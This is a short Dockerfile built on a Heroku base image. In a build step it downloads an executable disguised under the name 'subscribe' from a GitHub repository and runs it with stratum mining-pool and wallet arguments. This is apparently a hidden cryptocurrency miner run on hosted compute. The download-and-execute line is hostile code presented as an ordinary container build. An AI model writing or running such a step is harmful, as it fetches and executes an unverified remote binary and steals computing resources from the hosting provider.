FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/ggwpboy/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Mg4ttHdDPrhn81xb5d3yWPuEFoUJPAeLD2.rm1
CMD bash heroku.sh
